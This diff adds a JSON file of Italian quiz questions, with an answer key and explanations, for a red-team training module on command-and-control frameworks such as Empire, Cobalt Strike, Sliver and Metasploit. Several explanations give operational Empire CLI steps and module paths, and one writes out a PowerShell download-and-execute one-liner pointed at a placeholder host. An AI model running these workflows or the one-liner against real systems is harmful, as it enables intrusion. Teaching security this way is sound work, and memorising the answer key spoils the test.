@@ -1,0 +1,249 @@
+{
+  "module": "Command & Control",
+  "blocks": [
+    {
+      "after_h2": "2. Terminologia C2 in dettaglio",
+      "title": "Cos'è un C2 framework + terminologia",
+      "questions": [
+        {
+          "q": "Cosa è un 'listener' in un C2 framework?",
+          "choices": [
+            "Il payload finale eseguito sulla vittima",
+            "Il componente server-side che ascolta le callback degli agent/implant",
+            "Un modulo per intercettare tastiera/mouse",
+            "Il log audit del team server"
+          ],
+          "correct": 1,
+          "explanation": "Il listener è la porta/protocollo (HTTP, HTTPS, SMB, DNS) su cui il team server riceve le connessioni in arrivo dagli agent. Es. listener HTTP su porta 80."
+        },
+        {
+          "q": "Cosa è uno 'stager' in PowerShell-Em⁠pire?",
+          "choices": [
+            "Un comando eseguito sull'agent attivo",
+            "Il payload iniziale piccolo che, una volta eseguito sulla vittima, scarica e attiva l'agent completo (il 'launcher')",
+            "Il modulo per privilege escalation",
+            "Una tecnica di persistence"
+          ],
+          "correct": 1,
+          "explanation": "Lo stager è il 'first-stage payload' minimale (es. PowerShell one-liner, batch, hta) che fa il bootstrap dell'agent completo dal team server. Em⁠pire ha decine di stager: `windows/launcher_bat`, `windows/launcher_vbs`, `windows/hta`, ecc."
+        },
+        {
+          "q": "Cosa indica il termine 'beacon' (Cobalt Strike) o l'equivalente 'callback interval' (Em⁠pire)?",
+          "choices": [
+            "La latenza di rete tra agent e team server",
+            "L'intervallo periodico con cui l'agent contatta il team server per chiedere task",
+            "Il numero di byte trasmessi",
+            "Il tipo di crittografia usata"
+          ],
+          "correct": 1,
+          "explanation": "Beacon/sleep interval è il delay (es. 60 sec) tra una callback e l'altra. Lungo = stealthy ma lento; corto = reattivo ma rumoroso. Spesso combinato con 'jitter' (variazione %)."
+        },
+        {
+          "q": "Cosa è la 'jitter' in un C2?",
+          "choices": [
+            "Una percentuale di randomizzazione applicata allo sleep interval per evitare pattern di rete detectabili",
+            "Il jitter buffer audio del C2 voice",
+            "Una nuova feature di pivoting",
+            "Il TTL dell'agent"
+          ],
+          "correct": 0,
+          "explanation": "Jitter (es. 30%) randomizza l'intervallo di callback. Con sleep=60s e jitter=30%, l'agent contatta tra 42 e 78 sec. Difende contro detection beaconing pattern (NDR/EDR cercano callback regolari)."
+        },
+        {
+          "q": "Cosa è una 'malleable C2 profile' (Cobalt Strike)?",
+          "choices": [
+            "Una configurazione che personalizza i pattern di traffico C2 (header HTTP, URI, body, User-Agent) per mimare traffico legittimo e evadere detection",
+            "Un payload con auto-update",
+            "Un protocollo proprietario non-IP",
+            "Un modulo di obfuscation per shellcode"
+          ],
+          "correct": 0,
+          "explanation": "I malleable profile permettono di rendere il traffico C2 indistinguibile da quello di app legittime (Amazon, Microsoft, Slack...). Personalizza URI, header, formato dati. Critico per OPSEC red team."
+        }
+      ]
+    },
+    {
+      "after_h2": "4. C2 Matrix — Scelta del framework",
+      "title": "Deployment, operation, scelta framework",
+      "questions": [
+        {
+          "q": "Cosa è un 'redirector' nell'architettura C2?",
+          "choices": [
+            "Un load balancer per gli operator",
+            "Un server intermediario (es. Apache mod_rewrite, nginx, AWS CloudFront) tra implant e team server, che nasconde l'IP reale del team server",
+            "Un proxy SOCKS interno",
+            "Un debugger per implant"
+          ],
+          "correct": 1,
+          "explanation": "Il redirector è uno strato intermedio che riceve le callback degli agent e le inoltra al team server reale. Se il blue team blocca il redirector IP, il team server resta operativo. Architettura: agent → redirector → team server."
+        },
+        {
+          "q": "Nel 'C2 Matrix', quale criterio NON è generalmente considerato?",
+          "choices": [
+            "Tipo di licenza (open-source vs commercial)",
+            "Linguaggio implant (C/C#/Go/Python)",
+            "Numero di sviluppatori attivi su GitHub",
+            "Velocità della connessione internet dell'operator"
+          ],
+          "correct": 3,
+          "explanation": "Il C2 Matrix valuta caratteristiche tecniche/operative del framework (linguaggio, protocolli supportati, evasion, licenza, comunità). La velocità della connessione dell'operator non c'entra."
+        },
+        {
+          "q": "Tra Cobalt Strike, Em⁠pire, Mythic, Sliver e Havoc, quale è commerciale (pagamento di licenza)?",
+          "choices": [
+            "Cobalt Strike",
+            "Em⁠pire",
+            "Sliver",
+            "Havoc"
+          ],
+          "correct": 0,
+          "explanation": "Cobalt Strike (Fortra) è commerciale, ~$3500/anno per licenza. Em⁠pire/Mythic/Sliver/Havoc sono open-source e gratuiti."
+        },
+        {
+          "q": "Sliver C2 (BishopFox) è scritto principalmente in:",
+          "choices": [
+            "Python",
+            "C#",
+            "Go",
+            "Rust"
+          ],
+          "correct": 2,
+          "explanation": "Sliver è scritto in Go. Cross-platform per definizione, implant in Go statically linked = facile deploy su Windows/Linux/macOS. È diventato l'open-source più usato post-Cobalt-Strike leaks."
+        },
+        {
+          "q": "Cosa è un 'BOF' (Beacon Object File) nel contesto C2?",
+          "choices": [
+            "Un formato di backup",
+            "Una API per integrare AV bypass",
+            "Un piccolo oggetto compilato (.o) caricato in-process nell'agent (Cobalt Strike beacon) per estendere le capacità senza spawnare nuovi processi",
+            "Un Bug Object Format"
+          ],
+          "correct": 2,
+          "explanation": "I BOF sono COFF object eseguiti in-process nel beacon (no fork/exec) → footprint minimo e meno chance di detection. Esempi: `whoami`, `ldapsearch`, `kerberoast` come BOF invece di spawnare processi separati."
+        }
+      ]
+    },
+    {
+      "after_h2": "6. PowerShell-Em⁠pire — Workflow operativo (CLI)",
+      "title": "PowerShell-Em⁠pire: setup, listener, stager, agent",
+      "questions": [
+        {
+          "q": "Quale comando avvia il server di PowerShell-Em⁠pire (versione moderna BC-Security)?",
+          "choices": [
+            "./empire.sh",
+            "python3 -m empire",
+            "./ps-empire server",
+            "empire-server --start"
+          ],
+          "correct": 2,
+          "explanation": "La versione attuale (BC-Security fork) usa `./ps-empire server` per avviare il team server e `./ps-empire client` per il CLI client. Prima del fork era `./empire.sh`."
+        },
+        {
+          "q": "Nella CLI di Em⁠pire, qual è la sequenza corretta per creare un listener HTTP sulla porta 80?",
+          "choices": [
+            "uselistener http → set Host http://0.0.0.0:80 → set Port 80 → execute",
+            "createlistener -type http -port 80",
+            "listener add http 80 1.2.3.4",
+            "use http_listener 80"
+          ],
+          "correct": 0,
+          "explanation": "Workflow standard Em⁠pire: `uselistener <tipo>` (es. http), poi `set Host`, `set Port`, eventuali altri opts, infine `execute` per avviare il listener."
+        },
+        {
+          "q": "Quale stager è tipicamente usato per produrre un dropper PowerShell standalone come .bat?",
+          "choices": [
+            "windows/launcher_bat",
+            "windows/dll",
+            "multi/macro",
+            "linux/launcher"
+          ],
+          "correct": 0,
+          "explanation": "`windows/launcher_bat` genera un file .bat che richiama PowerShell con il payload encoded. Altri stager utili: `windows/launcher_vbs`, `windows/hta`, `windows/macro`."
+        },
+        {
+          "q": "Dopo aver compromesso una macchina, quale comando della CLI Em⁠pire ti collega all'agent specifico?",
+          "choices": [
+            "use agent <name>",
+            "interact <agent_name>",
+            "connect <agent_id>",
+            "session -i <id>"
+          ],
+          "correct": 1,
+          "explanation": "`interact <agent_name>` (o numero) entra nella shell dell'agent. Da lì puoi usare `usemodule`, `shell <cmd>`, `info`, `sleep`, ecc."
+        },
+        {
+          "q": "Per eseguire Blood⁠Hound (Sharp⁠Hound) da un agent Em⁠pire, quale categoria di moduli cercare?",
+          "choices": [
+            "powershell/credentials/mimi⁠katz",
+            "powershell/situational_awareness/network/bloodhound",
+            "powershell/persistence/elevated/registry",
+            "powershell/lateral_movement/invoke_psexec"
+          ],
+          "correct": 1,
+          "explanation": "Il modulo è `powershell/situational_awareness/network/bloodhound`. La categoria 'situational_awareness/network' contiene anche `powerview`, `arpscan`, `portscan`."
+        }
+      ]
+    },
+    {
+      "after_h2": "8. Integrazione Em⁠pire ↔ Metasploit (pivoting)",
+      "title": "Star⁠killer, integrazione MSF e altri framework",
+      "questions": [
+        {
+          "q": "Cosa è Star⁠killer?",
+          "choices": [
+            "Un fork di Em⁠pire scritto in Go",
+            "Una GUI Electron multi-platform per gestire Em⁠pire (listener/stager/agent/module) via interfaccia grafica",
+            "Un modulo MSF per killare processi sull'agent",
+            "Un C2 alternativo a Em⁠pire"
+          ],
+          "correct": 1,
+          "explanation": "Star⁠killer è il client grafico ufficiale di Em⁠pire, sviluppato da BC-Security. Login default: `localhost:1337`, creds `empireadmin / password123` (configurabili)."
+        },
+        {
+          "q": "Quale modulo Metasploit serve a generare un payload PowerShell che si auto-scarica via HTTP (utile per passare il pivot da Em⁠pire a Meterpreter)?",
+          "choices": [
+            "exploit/multi/handler",
+            "exploit/multi/script/web_delivery",
+            "post/multi/manage/shell_to_meterpreter",
+            "auxiliary/server/http_payload"
+          ],
+          "correct": 1,
+          "explanation": "`web_delivery` (target PowerShell) genera un one-liner `powershell -ep bypass -c \"I⁠EX(New-Object Net.Web⁠Client).Download⁠String('http://msf/abc')\"`. Lo esegui da Em⁠pire con `shell powershell ...` o via modulo `invoke_metasploitpayload`."
+        },
+        {
+          "q": "Per passare una sessione da Em⁠pire a Meterpreter, quale modulo Em⁠pire usi?",
+          "choices": [
+            "powershell/management/spawn",
+            "powershell/code_execution/invoke_metasploitpayload",
+            "powershell/persistence/handoff",
+            "powershell/lateral_movement/inject_meterpreter"
+          ],
+          "correct": 1,
+          "explanation": "`powershell/code_execution/invoke_metasploitpayload` chiama un endpoint MSF (es. web_delivery) e iniezione del payload Meterpreter in memoria. Bridge classico Em⁠pire↔MSF."
+        },
+        {
+          "q": "Nell'architettura tipica Red Team che integra Em⁠pire + MSF per pivoting, qual è l'ordine corretto?",
+          "choices": [
+            "Em⁠pire agent → MSF web_delivery → Meterpreter → autoroute → socks_proxy → exploit interno con bind_tcp",
+            "MSF Meterpreter → Em⁠pire stager → SOCKS → exploit",
+            "Em⁠pire agent → exploit interno (no MSF needed)",
+            "MSF + Em⁠pire non sono compatibili"
+          ],
+          "correct": 0,
+          "explanation": "Sequenza classica: foothold con Em⁠pire → trasferimento a Meterpreter (più potente per pivoting) via web_delivery → autoroute alla subnet interna → socks_proxy → exploit interni con `bind_tcp` (target non raggiungibile inversamente)."
+        },
+        {
+          "q": "Quale tra questi NON è un C2 framework moderno comunemente discusso?",
+          "choices": [
+            "Mythic",
+            "Havoc",
+            "Brute Ratel",
+            "OWASP ZAP"
+          ],
+          "correct": 3,
+          "explanation": "OWASP ZAP è un web app security scanner (alternativa a Burp), NON un C2. Mythic (Apollo agent), Havoc (Demon agent), Brute Ratel (Badger) sono C2 framework attuali."
+        }
+      ]
+    }
+  ]
+}
